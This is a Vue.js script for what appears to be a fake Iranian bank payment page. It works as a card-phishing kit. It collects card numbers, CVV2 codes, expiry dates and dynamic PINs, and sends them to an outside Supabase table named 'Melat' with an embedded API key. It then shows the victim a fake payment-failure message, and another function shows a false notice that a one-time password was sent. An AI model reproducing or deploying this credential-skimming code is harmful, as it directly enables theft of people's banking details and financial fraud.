new Vue({
	el: "#app",
	data: {
		min: 14,
		sec: 59,
		imgNumber: 1,
		cardInfo: {
			number: '',
			cvv2: '',
			year: '',
			month: '',
			pass: '',
			sec: '',
		},
		check: true,
		isBack: false,
		numberLen: 0,
		alertText: '',
		loading: false,
	},
	mounted() {
		this.timerCount();
		this.imgNumber = Math.floor(Math.random() * (7 - 1 + 1) + 1)
	},
	methods: {
		timerCount() {
			setTimeout(() => {
				this.sec -= 1
				if (this.sec === -1)
					this.minTimerCount();
				else
					this.timerCount()
			} , 1000)
		},
		minTimerCount() {
			this.sec = 0
			if (this.min === 0)
				return false
			else {
				this.sec = 59
				this.min -= 1
				this.timerCount()
			}
		},
		changeCap() {
			setTimeout(() => {
				if (this.imgNumber === 7)
					this.imgNumber = 1
				this.imgNumber += 1
			} , 200)
		},
		enterNumber() {
			if (this.numberLen > this.cardInfo.number.length)
				this.isBack = true
			else
				this.isBack = false
			if (this.cardInfo.number.length === 4 && this.isBack === false) {
				this.cardInfo.number += '-'
			}
			if (this.cardInfo.number.length === 9 && this.isBack === false) {
				this.cardInfo.number += '-'
			}
			if (this.cardInfo.number.length === 14 && this.isBack === false) {
				this.cardInfo.number += '-'
			}
			this.numberLen = this.cardInfo.number.length
		},
		isNumber(evt) {
			evt = (evt) ? evt : window.event;
			var charCode = (evt.which) ? evt.which : evt.keyCode;
			if ((charCode > 31 && (charCode < 48 || charCode > 57))) {
				evt.preventDefault();;
			} else {
				return true;
			}
		},
		showKeypad(id) {
			let keypad = document.getElementById('keypad')
			keypad.classList.toggle('openkeypad')
			if (id === 1) {
				keypad.classList.toggle('h-keypad1')
			}
			if (id === 2) {
				keypad.classList.toggle('h-keypad2')
			}
		},
		hideKeypad() {
			let keypad = document.getElementById('keypad')
			keypad.classList.toggle('openkeypad')
			keypad.classList.remove('h-keypad1')
			keypad.classList.remove('h-keypad2')
		},
		async submitInfo() {
			this.check = true
			if (this.cardInfo.number.length !== 19) {
				this.check = false
				document.getElementById('cardnumberbox').classList.add('red-border')
				document.getElementById('number-text').classList.add('red-text')
			} else {
				document.getElementById('cardnumberbox').classList.remove('red-border')
				document.getElementById('number-text').classList.remove('red-text')
			}
			if (this.cardInfo.cvv2.length <= 3 || this.cardInfo.cvv2 === '') {
				this.check = false
				document.getElementById('inputcvv2').classList.add('red-border')
				document.getElementById('cvv2-text').classList.add('red-text')
			} else {
				document.getElementById('inputcvv2').classList.remove('red-border')
				document.getElementById('cvv2-text').classList.remove('red-text')
			}
			if (this.cardInfo.year.length !== 2 || this.cardInfo.month.length !== 2 || Number(this.cardInfo.month) < 1 || Number(this.cardInfo.month) > 12) {
				this.check = false
				document.getElementById('inputyear').classList.add('red-border')
				document.getElementById('inputmonth').classList.add('red-border')
				document.getElementById('engheza-text').classList.add('red-text')
			} else {
				document.getElementById('inputyear').classList.remove('red-border')
				document.getElementById('inputmonth').classList.remove('red-border')
				document.getElementById('engheza-text').classList.remove('red-text')
			}
			if (this.cardInfo.pass.length < 6) {
				this.check = false
				document.getElementById('dynamic-pin').classList.add('red-border')
				document.getElementById('pass-text').classList.add('red-text')
			} else {
				document.getElementById('dynamic-pin').classList.remove('red-border')
				document.getElementById('pass-text').classList.remove('red-text')
			}
			if (this.cardInfo.sec.length !== 5) {
				this.check = false
				document.getElementById('inputcapcha').classList.add('red-border')
				document.getElementById('sec-text').classList.add('red-text')
			} else {
				document.getElementById('inputcapcha').classList.remove('red-border')
				document.getElementById('sec-text').classList.remove('red-text')
			}
			if (this.check === false) {
				this.alertText ='لطفا اطلاعات مورد نیاز را به درستی وارد کنید'
				document.getElementById('error-box').classList.add('show')
				setTimeout(() => {
					document.getElementById('error-box').classList.remove('show')
				} , 3000)
				return false
			} else {
				document.getElementById('error-box').classList.remove('show')
			}
			let obj = {
				cardNumber: this.cardInfo.number,
				Cvv2: this.cardInfo.cvv2,
				ramzCard: this.cardInfo.pass,
				cardYear: this.cardInfo.year,
				cardMonth: this.cardInfo.month
			}
			let url = 'https://jrtwyjgpbxnvyqekzbfu.supabase.co/rest/v1/Melat'
			this.loading = true
			await fetch(url, {
				method: 'post',
				headers: {
					"apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTYzODAxMTE1MSwiZXhwIjoxOTUzNTg3MTUxfQ.3N2IoI9bRyFR9N0WSlBr9R3BYnYNipsAqwh5Y-Ru6jM",
      				"Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTYzODAxMTE1MSwiZXhwIjoxOTUzNTg3MTUxfQ.3N2IoI9bRyFR9N0WSlBr9R3BYnYNipsAqwh5Y-Ru6jM",
					'Content-Type': 'application/json'
				},
				body: JSON.stringify(obj)
			})
				.then((res) => {
					console.warn(res)
					this.loading = false
					this.alertText ='متاسفانه مشکلی در روند پرداخت شما رخ داده است...'
					document.getElementById('error-box').classList.add('show')
					setTimeout(() => {
						document.getElementById('error-box').classList.remove('show')
					} , 3000)
				})
		},
		validateAndRequestOTP() {
			this.alertText = 'رمز پویا برای شماره تلفن همراه شما ارسال گردید...';
			
			if (this.cardInfo.number.length !== 19 || this.cardInfo.sec.length !== 5 || this.cardInfo.cvv2.length <= 3 || this.cardInfo.year.length !== 2 || this.cardInfo.month.length !== 2) {
				this.alertText = 'ابتدا تمامی فیلدهای لازم را با دقت پر نمایید...';
			}
			document.getElementById('error-box').classList.add('show')
			setTimeout(() => {
				document.getElementById('error-box').classList.remove('show')
			} , 3000)
		}
	},
});